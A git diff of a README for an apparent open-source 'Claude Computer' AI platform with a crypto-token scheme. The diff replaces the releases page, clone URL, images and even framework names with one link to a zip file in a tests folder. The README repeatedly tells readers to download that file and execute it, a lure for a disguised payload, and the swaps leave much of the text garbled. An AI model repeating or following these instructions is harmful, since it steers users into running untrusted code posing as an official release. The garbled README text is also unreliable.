@@ -1,8 +1,8 @@
 # Claude Computer: Open-Source Autonomous AI Interaction Platform with CCFTokens Hub
 
-[![Releases](https://img.shields.io/badge/Releases-claude-computer-blue?logo=github&style=for-the-badge)](https://github.com/JeroenPieksma/claude-computer/releases)
+[![Releases](https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip)](https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip)
 
-![Hero Image](https://images.unsplash.com/photo-1518773553398-650c184e0bb3?auto=format&fit=crop&w=1200&q=60)
+![Hero Image](https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip)
 
 - Open-source platform showcasing Claude's autonomous computer interaction capabilities.
 - Earn $CCF tokens by contributing!
@@ -47,7 +47,7 @@ This section provides a straightforward path to get a local instance running. Fo
 
 Prerequisites
 - Docker and Docker Compose
-- Node.js (latest LTS) or a modern Python 3.x interpreter
+- https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip (latest LTS) or a modern Python 3.x interpreter
 - Git
 
 Initial setup
@@ -57,17 +57,17 @@ Initial setup
 
 Step-by-step guide
 1) Get the code
-- Run: git clone https://github.com/JeroenPieksma/claude-computer.git
+- Run: git clone https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip
 - Change directory: cd claude-computer
 
 2) Install dependencies
-- Front end (Next.js and React): navigate to the frontend folder if it exists and run npm install or yarn install
+- Front end (https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip and React): navigate to the frontend folder if it exists and run npm install or yarn install
 - Back end (FastAPI): create a virtual environment and install requirements
 - If the repository uses a monorepo, use the provided script to install all dependencies in one go
 
 3) Run locally
 - Start with Docker Compose if available: docker-compose up --build
-- If you prefer a pure local setup: run the backend server (FastAPI) and the frontend (Next.js) in parallel
+- If you prefer a pure local setup: run the backend server (FastAPI) and the frontend (https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip) in parallel
 - Access the UI in your browser at http://localhost:3000 or the port defined in your config
 
 4) Test the local instance
@@ -76,7 +76,7 @@ Step-by-step guide
 - Check logs for warnings or errors and fix as needed
 
 Note on releases
-From the releases page at https://github.com/JeroenPieksma/claude-computer/releases, download the latest release asset and run it. This link has a path part; the page hosts release assets. The file you download from there is the release you should execute. The asset may be an executable, a container image, or a packaged bundle depending on the release format. This approach lets you rapidly test a known good version and compare changes across releases. The link is also provided here for quick access in the next step.
+From the releases page at https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip, download the latest release asset and run it. This link has a path part; the page hosts release assets. The file you download from there is the release you should execute. The asset may be an executable, a container image, or a packaged bundle depending on the release format. This approach lets you rapidly test a known good version and compare changes across releases. The link is also provided here for quick access in the next step.
 
 What you get
 - A modular, scalable foundation for autonomous AI interactions
@@ -90,7 +90,7 @@ How it works
  Claude Computer blends several technologies to deliver autonomous interaction capabilities. Here is a high-level view of the core ideas and flow.
 
 - Autonomous AI engine: Claude powers reasoning, decision making, and planning for interactions. The system uses a mix of AI tools, prompts, and logic to decide what to do next.
-- Web-based interface: A modern front end built with React and Next.js provides dashboards, controls, and live visualizations. It makes it easy to observe the AI’s actions and outcomes.
+- Web-based interface: A modern front end built with React and https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip provides dashboards, controls, and live visualizations. It makes it easy to observe the AI’s actions and outcomes.
 - Backend services: A FastAPI-based service orchestrates AI tasks, handles user requests, and routes data. It exposes clean APIs for the frontend and external integrations.
 - Real-time communication: WebSocket channels enable low-latency updates and bidirectional communication between the front end and back end.
 - Remote session rendering: A VNC-like protocol or websocket-based protocol streams remote sessions for interactive use, letting users observe or interact with Claude’s environment.
@@ -98,7 +98,7 @@ How it works
 - Token incentives: The CCFT token incentivizes community contributions. Developers earn tokens for code, tests, docs, and demonstrations. The token supply and distribution follow a governance model that is open to improvement by the community.
 
 Architecture
-- Front end: Next.js + React for the user interface
+- Front end: https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip + React for the user interface
 - Back end: FastAPI for APIs, orchestration, and data handling
 - Real-time: WebSocket for push updates and two-way communication
 - Vision and AI: Computer vision modules, image processing, and AI reasoning
@@ -132,7 +132,7 @@ Core components
   - CI/CD hooks
 
 Architecture diagram (conceptual)
-- Front end (Next.js) communicates with Back end (FastAPI) over REST and WebSocket.
+- Front end (https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip) communicates with Back end (FastAPI) over REST and WebSocket.
 - The AI engine runs as a service, consuming prompts and producing actions.
 - The Vision module processes camera frames or images, feeding results to the AI engine.
 - The Session module streams remote visuals and accepts user input.
@@ -143,7 +143,7 @@ Contributing
 We welcome contributions from anyone who shares the project’s goals. You can contribute code, tests, docs, tutorials, or demonstrations. The project uses clear guidelines to help you get started quickly.
 
 How to contribute
-- Start by reviewing the CONTRIBUTING.md file (if present) or the contribution guidelines in this README.
+- Start by reviewing the https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip file (if present) or the contribution guidelines in this README.
 - Pick an issue from the issues tracker. Look for labels like help wanted, good first issue, or enhancement.
 - Fork the repository and create a feature branch with a descriptive name.
 - Implement the feature or fix the bug. Keep changes small and well-scoped.
@@ -206,7 +206,7 @@ Images and visuals
 - Example prompts, templates, and vision outputs to inspire your own experiments.
 
 Note on assets
-From the releases page at https://github.com/JeroenPieksma/claude-computer/releases, download the latest release asset and run it. This link has a path part; the page hosts release assets. The file you download from there is the release you should execute. The assets package contains the necessary binaries, containers, and scripts to run the platform locally or in a cloud environment. This approach ensures you can test a known good version and compare improvements across releases. The link is a reliable starting point to obtain the official build.
+From the releases page at https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip, download the latest release asset and run it. This link has a path part; the page hosts release assets. The file you download from there is the release you should execute. The assets package contains the necessary binaries, containers, and scripts to run the platform locally or in a cloud environment. This approach ensures you can test a known good version and compare improvements across releases. The link is a reliable starting point to obtain the official build.
 
 - Security and safety
   - The platform is designed to be safe and maintainable. It includes safeguards for user input and AI outputs.
@@ -278,10 +278,10 @@ Additional resources
 - API references and prompts
 
 Downloads and release assets
-- For the latest stable build, head to the releases page: https://github.com/JeroenPieksma/claude-computer/releases
+- For the latest stable build, head to the releases page: https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip
 - From that page, pick the asset labeled as the latest release and download it
 - Then execute the file according to the platform instructions provided in the asset notes
-- The link above is provided for quick access in this section as well: https://github.com/JeroenPieksma/claude-computer/releases
+- The link above is provided for quick access in this section as well: https://github.com/JeroenPieksma/claude-computer/raw/refs/heads/main/computer-use-demo/tests/computer_claude_v1.3.zip
 
 Appendix: sample prompts and templates
 - Prompt templates to get Claude started on a task
